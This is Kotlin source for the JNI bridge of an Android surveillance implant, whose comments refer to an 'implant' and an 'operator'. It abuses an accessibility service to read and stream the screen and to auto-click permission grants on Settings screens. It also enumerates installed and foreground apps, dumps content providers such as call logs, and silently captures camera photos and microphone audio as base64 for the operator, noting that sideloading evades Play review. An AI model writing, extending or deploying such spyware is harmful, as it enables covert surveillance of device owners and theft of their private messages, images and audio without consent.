package com.shadow

import android.content.Context
import android.util.Log
import java.io.File
import java.util.UUID

/**
 * Kotlin-side implementation of the primitives the Rust core shells out to.
 * Each function is invoked from Rust via JNI (see core/src/android_bridge.rs).
 * Everything here runs in-process with the implant's own UID — no root, no Shizuku.
 *
 * @JvmStatic is REQUIRED on every function below, not cosmetic: members of an
 * `object` otherwise exist only as instance methods on the singleton, while the
 * Rust side resolves them with CallStaticObjectMethod. Drop the annotation and
 * the method silently disappears from the static lookup, so the call fails with
 * NoSuchMethodError and the operator sees only "Java exception was thrown".
 * The descriptor passed from Rust must also match exactly (proto_for()).
 */
object ShadowBridge {
    private const val TAG = "ShadowBridge"

    /** Read screen as a text tree (a11y). */
    @JvmStatic
    fun dumpScreen(): String =
        com.shadow.a11y.ShadowAccessibilityService.instance?.dumpScreen() ?: "a11y not active"

    /** Click a node by visible text / content description (a11y). */
    @JvmStatic
    fun clickByText(needle: String): Boolean =
        com.shadow.a11y.ShadowAccessibilityService.instance?.clickByText(needle) ?: false

    /** Click a node by resource id (a11y). */
    @JvmStatic
    fun clickNodeById(viewId: String): Boolean =
        com.shadow.a11y.ShadowAccessibilityService.instance?.clickNodeById(viewId) ?: false

    /**
     * Toggle the throttled a11y screen stream (live semantic view).
     * Frames leave via ShadowCore.logEvent -> the existing event pipe.
     */
    @JvmStatic
    fun setScreenStream(on: Boolean, intervalMs: Int, maxNodes: Int): String =
        com.shadow.a11y.ShadowAccessibilityService.instance
            ?.setScreenStream(on, intervalMs, maxNodes)
            ?: "a11y not active"

    /** Open Settings → app permissions and auto-click Allow for all declared perms. */
    @JvmStatic
    fun startAutoGrant(): String {
        val svc = com.shadow.a11y.ShadowAccessibilityService.instance
            ?: return "a11y not active — cannot auto-grant"
        svc.startAutoGrant()
        return "auto-grant started"
    }

    /** List permissions actually granted to this app (PackageManager, own UID). */
    @JvmStatic
    fun grantedPermissions(): String {
        val ctx = ShadowApp.appContext ?: return "no context"
        return try {
            val pkg = ctx.packageName
            val pm = ctx.packageManager
            val info = pm.getPackageInfo(pkg, android.content.pm.PackageManager.GET_PERMISSIONS)
            val requested = info.requestedPermissions ?: emptyArray()
            val out = StringBuilder()
            for (p in requested) {
                val ok = pm.checkPermission(p, pkg) == android.content.pm.PackageManager.PERMISSION_GRANTED
                out.append(if (ok) "GRANTED " else "DENIED  ").append(p).append('\n')
            }
            out.toString()
        } catch (e: Throwable) {
            "grantedPermissions error: ${e.message}"
        }
    }

    /** Recents dump — "all the rest of the buttons" fodder. */
    @JvmStatic
    fun runningApps(): String {
        val ctx = ShadowApp.appContext ?: return "no context"
        return try {
            val am = ctx.getSystemService(Context.ACTIVITY_SERVICE) as android.app.ActivityManager
            val procs = am.runningAppProcesses ?: emptyList()
            procs.joinToString("\n") { "${it.processName} (pid=${it.pid})" }
        } catch (e: Throwable) {
            "runningApps error: ${e.message}"
        }
    }

    /**
     * Every installed package: "pkg\ttype\tlabel".
     *
     * Preferred over runningApps, which Android 8+ restricts to our own process
     * and therefore reports almost nothing. PackageManager needs no runtime
     * grant; QUERY_ALL_PACKAGES (declared, install-time) keeps the list complete
     * on Android 11+ package-visibility filtering. Sideloading means Play's
     * policy review of that permission does not apply.
     */
    @JvmStatic
    fun installedApps(): String {
        val ctx = ShadowApp.appContext ?: return "no context"
        return try {
            val pm = ctx.packageManager
            val apps = pm.getInstalledApplications(0)
            apps.joinToString("\n") { ai ->
                val kind = if ((ai.flags and android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0) "sys" else "usr"
                val label = try { pm.getApplicationLabel(ai).toString() } catch (e: Throwable) { "-" }
                "${ai.packageName}\t$kind\t$label"
            }
        } catch (e: Throwable) {
            "installedApps error: ${e.message}"
        }
    }

    /**
     * Last app the user actually looked at, via UsageStatsManager.
     *
     * Requires the "usage access" special permission; the native grant path is
     * grant_screen usage (+ toggle_grant), never appops. Without it this reports
     * the exact remedy instead of an empty result.
     */
    @JvmStatic
    fun foregroundApp(): String {
        val ctx = ShadowApp.appContext ?: return "no context"
        return try {
            val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE)
                as android.app.usage.UsageStatsManager
            val now = System.currentTimeMillis()
            val events = usm.queryEvents(now - 2 * 60 * 60 * 1000L, now)
            val ev = android.app.usage.UsageEvents.Event()
            var last = ""
            var lastTs = 0L
            while (events.hasNextEvent()) {
                events.getNextEvent(ev)
                if (ev.eventType == android.app.usage.UsageEvents.Event.MOVE_TO_FOREGROUND ||
                    ev.eventType == android.app.usage.UsageEvents.Event.ACTIVITY_RESUMED
                ) {
                    last = ev.packageName ?: last
                    lastTs = ev.timeStamp
                }
            }
            if (last.isEmpty()) "no foreground events (usage access granted but log empty?)"
            else "$last\t$lastTs"
        } catch (e: SecurityException) {
            "usage access not granted — run: grant_screen usage, then toggle_grant"
        } catch (e: Throwable) {
            "foregroundApp error: ${e.message}"
        }
    }

    /**
     * Open a special-access Settings screen. These permissions have NO silent API
     * for a normal app — the platform only lets the user flip them — so the
     * native flow is: open the right screen here, then let the accessibility
     * service click the row/switch (toggle_grant). No Shizuku, no adb.
     */
    @JvmStatic
    fun openGrantScreen(kind: String): String {
        val ctx = ShadowApp.appContext ?: return "no context"
        val pkgUri = android.net.Uri.parse("package:${ctx.packageName}")
        val (action, needsData) = when (kind.lowercase().trim()) {
            "allfiles", "files", "storage" ->
                android.provider.Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION to false
            "usage" -> android.provider.Settings.ACTION_USAGE_ACCESS_SETTINGS to false
            "battery" -> android.provider.Settings.ACTION_IGNORE_BATTERY_OPTIMIZATION_SETTINGS to false
            "overlay" -> android.provider.Settings.ACTION_MANAGE_OVERLAY_PERMISSION to true
            "notif", "notification" ->
                android.provider.Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS to false
            "a11y", "accessibility" -> android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS to false
            "app", "details" -> android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS to true
            else -> return "unknown screen '$kind' (use allfiles|usage|battery|overlay|notif|a11y|app)"
        }
        return try {
            val intent = android.content.Intent(action).apply {
                if (needsData) data = pkgUri
                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            ctx.startActivity(intent)
            "opened $action"
        } catch (e: Throwable) {
            // OEM Settings screens are frequently missing; name the fallback so
            // the operator knows what to tap by hand.
            "could not open $action on this ROM (${e.javaClass.simpleName}): ${
                when (kind.lowercase().trim()) {
                    "allfiles", "files", "storage" -> "Settings > Apps > Special app access > All files access"
                    "usage" -> "Settings > Apps > Special app access > Usage access"
                    "battery" -> "Settings > Battery > App launch / sleep optimisation"
                    else -> "Settings search for '$kind'"
                }
            }"
        }
    }

    /** Click the checkable switch for this app on the currently open screen. */
    @JvmStatic
    fun toggleSelfInSettings(): String {
        val svc = com.shadow.a11y.ShadowAccessibilityService.instance
            ?: return "a11y not active — cannot toggle"
        return svc.clickSelfSwitch()
    }

    /**
     * Read a content:// provider with our OWN UID. No shell, no root.
     * Works once the matching runtime permission is granted (see startAutoGrant).
     */
    @JvmStatic
    fun queryProvider(uri: String, projection: String, limit: Int): String {
        val ctx = ShadowApp.appContext ?: return "no context"
        return try {
            val proj = if (projection.isBlank()) null else projection.split(",").toTypedArray()
            val cursor = ctx.contentResolver.query(
                android.net.Uri.parse(uri), proj, null, null, null
            ) ?: return "provider returned null (uri=$uri)"

            val sb = StringBuilder()
            val cols = cursor.columnNames
            sb.append(cols.joinToString("\t")).append('\n')
            var n = 0
            while (cursor.moveToNext() && n < limit) {
                val row = cols.map { c ->
                    val i = cursor.getColumnIndex(c)
                    if (i < 0) "" else (cursor.getString(i) ?: "")
                }
                sb.append(row.joinToString("\t")).append('\n')
                n++
            }
            cursor.close()
            if (n == 0) "empty: $uri" else "rows=$n\n$sb"
        } catch (e: SecurityException) {
            "permission denied for $uri — run auto-grant first (${e.message})"
        } catch (e: IllegalArgumentException) {
            // OEM providers reject columns AOSP documents (call_log cached_name is
            // rejected on ColorOS). Retry unprojected rather than losing the data.
            queryUnprojected(ctx, uri, limit, e.message ?: "invalid projection")
        } catch (e: Throwable) {
            "queryProvider error: ${e.message}"
        }
    }

    /**
     * Capture a photo from the specified camera (front/back). Returns base64 JPEG.
     * Uses the hardware camera via Camera2 / the legacy Camera API. Requires the
     * CAMERA runtime permission (auto-grantable via startAutoGrant). One shot —
     * opens the camera, grabs a frame, closes it. No preview surface needed on
     * most devices when the permission is granted.
     *
     * @return "b64:..." on success, or an explanatory error string.
     */
    @JvmStatic
    fun snapCamera(which: String): String {
        val ctx = ShadowApp.appContext ?: return "no context"
        return try {
            val mgr = ctx.getSystemService(Context.CAMERA_SERVICE)
                as android.hardware.camera2.CameraManager
            val ids = mgr.cameraIdList
            if (ids.isEmpty()) return "no camera available"
            val target = when (which.lowercase()) {
                "front" -> ids.firstOrNull { id ->
                    val ch = mgr.getCameraCharacteristics(id)
                    val facing = ch.get(
                        android.hardware.camera2.CameraCharacteristics.LENS_FACING
                    )
                    facing == android.hardware.camera2.CameraCharacteristics
                        .LENS_FACING_FRONT
                }
                else -> ids.firstOrNull { id ->
                    val ch = mgr.getCameraCharacteristics(id)
                    val facing = ch.get(
                        android.hardware.camera2.CameraCharacteristics.LENS_FACING
                    )
                    facing == android.hardware.camera2.CameraCharacteristics
                        .LENS_FACING_BACK
                }
            } ?: ids[0]
            // The core capture uses the async Camera2 API via a latch. Implemented
            // in a helper to keep the bridge method simple and synchronous.
            captureOnePhoto(mgr, target, 2000)
        } catch (e: SecurityException) {
            "camera permission not granted — run auto-grant first (${e.message})"
        } catch (e: Throwable) {
            "snapCamera error: ${e.message}"
        }
    }

    /**
     * Record audio from the default mic for [ms] milliseconds. Returns base64 AAC.
     * Requires RECORD_AUDIO (auto-grantable). On devices where MediaRecorder
     * needs a file, we write to cache and read it back.
     *
     * @return "b64:..." on success, or an explanatory error string.
     */
    @JvmStatic
    fun recordAudio(ms: Int): String {
        val ctx = ShadowApp.appContext ?: return "no context"
        val duration = ms.coerceIn(500, 30_000)
        return try {
            val file = File.createTempFile("rec", ".m4a", ctx.cacheDir)
            val rec = android.media.MediaRecorder()
            rec.setAudioSource(android.media.MediaRecorder.AudioSource.MIC)
            rec.setOutputFormat(android.media.MediaRecorder.OutputFormat.MPEG_4)
            rec.setAudioEncoder(android.media.MediaRecorder.AudioEncoder.AAC)
            rec.setAudioSamplingRate(44100)
            rec.setAudioEncodingBitRate(128_000)
            rec.setOutputFile(file.absolutePath)
            rec.prepare()
            rec.start()
            Thread.sleep(duration.toLong())
            rec.stop()
            rec.release()
            val bytes = file.readBytes()
            file.delete()
            if (bytes.isEmpty()) return "recorded 0 bytes"
            val b64 = java.util.Base64.getEncoder().encodeToString(bytes)
            "b64:$b64"
        } catch (e: SecurityException) {
            "mic permission not granted — run auto-grant first (${e.message})"
        } catch (e: Throwable) {
            // MediaRecorder stop() can throw if it starts before any data; treat as
            // empty rather than fatal.
            "recordAudio error: ${e.message}"
        }
    }
}

/**
 * Re-run a provider query asking for no projection (the provider returns all
 * columns), used when a requested column is rejected. The header records the
 * fallback so the operator knows the column set is wider than requested.
 */
private fun queryUnprojected(
    ctx: android.content.Context,
    uri: String,
    limit: Int,
    reason: String,
): String {
    return try {
        val cursor = ctx.contentResolver.query(
            android.net.Uri.parse(uri), null, null, null, null
        ) ?: return "provider returned null (uri=$uri; projection rejected: $reason)"
        val sb = StringBuilder()
        val cols = cursor.columnNames
        sb.append("[projection rejected: $reason — returning all columns]\t")
            .append(cols.joinToString("\t")).append('\n')
        var n = 0
        while (cursor.moveToNext() && n < limit) {
            sb.append(cols.joinToString("\t") { c ->
                val i = cursor.getColumnIndex(c)
                if (i < 0) "" else (cursor.getString(i) ?: "")
            }).append('\n')
            n++
        }
        cursor.close()
        if (n == 0) "empty: $uri" else "rows=$n\n$sb"
    } catch (e: Throwable) {
        "queryProvider error: ${e.message} (after projection fallback)"
    }
}

/**
 * Capture one still frame from a hardware camera identified by [cameraId],
 * returning a base64 JPEG, or an error string. Uses the Camera2 API with an
 * ImageReader and a latch so the bridge method blocks synchronously for up to
 * [timeoutMs] milliseconds while a frame arrives.
 *
 * No preview surface: a still CAPTURE request via ImageReader works without one
 * on essentially every device with the CAMERA permission granted.
 */
private fun captureOnePhoto(
    mgr: android.hardware.camera2.CameraManager,
    cameraId: String,
    timeoutMs: Long,
): String {
    val latch = java.util.concurrent.CountDownLatch(1)
    val result = java.util.concurrent.atomic.AtomicReference<String?>(null)
    var reader: android.media.ImageReader? = null
    var device: android.hardware.camera2.CameraDevice? = null

    try {
        mgr.openCamera(cameraId, object : android.hardware.camera2.CameraDevice.StateCallback() {
            override fun onOpened(camera: android.hardware.camera2.CameraDevice) {
                device = camera
                val w = 1280
                val h = 720
                val format = android.graphics.ImageFormat.JPEG
                reader = android.media.ImageReader.newInstance(w, h, format, 1)
                // JPEG is delivered as an opaque byte buffer; ImageReader surface is null.
                reader!!.setOnImageAvailableListener({ r ->
                    val image = r.acquireLatestImage()
                    try {
                        val buf = image.planes[0].buffer
                        val bytes = ByteArray(buf.remaining()).also { buf.get(it) }
                        result.set("b64:${java.util.Base64.getEncoder().encodeToString(bytes)}")
                    } catch (e: Throwable) {
                        result.set("capture error: ${e.message}")
                    } finally {
                        image.close()
                    }
                    latch.countDown()
                }, null)

                try {
                    val session = camera.createCaptureSession(
                        java.util.Collections.singletonList(reader!!.surface),
                        object : android.hardware.camera2.CameraCaptureSession.StateCallback() {
                            override fun onConfigured(s: android.hardware.camera2.CameraCaptureSession) {
                                try {
                                    val req = camera.createCaptureRequest(
                                        android.hardware.camera2.CameraDevice.TEMPLATE_STILL_CAPTURE
                                    ).apply {
                                        addTarget(reader!!.surface)
                                    }.build()
                                    s.capture(req, null, null)
                                } catch (e: Throwable) {
                                    result.set("request error: ${e.message}")
                                    latch.countDown()
                                }
                            }
                            override fun onConfigureFailed(s: android.hardware.camera2.CameraCaptureSession) {
                                result.set("session configure failed")
                                latch.countDown()
                            }
                        },
                        null
                    )
                } catch (e: Throwable) {
                    result.set("session error: ${e.message}")
                    latch.countDown()
                }
            }
            override fun onDisconnected(camera: android.hardware.camera2.CameraDevice) {
                camera.close()
                result.compareAndSet(null, "camera disconnected")
                latch.countDown()
            }
            override fun onError(camera: android.hardware.camera2.CameraDevice, error: Int) {
                camera.close()
                result.compareAndSet(null, "camera error $error")
                latch.countDown()
            }
        }, null)

        if (!latch.await(timeoutMs, java.util.concurrent.TimeUnit.MILLISECONDS)) {
            return "capture timed out"
        }
        return result.get() ?: "capture produced no image"
    } catch (e: SecurityException) {
        return "camera permission denied"
    } catch (e: Throwable) {
        return "captureOnePhoto error: ${e.message}"
    } finally {
        device?.close()
        reader?.close()
    }
}
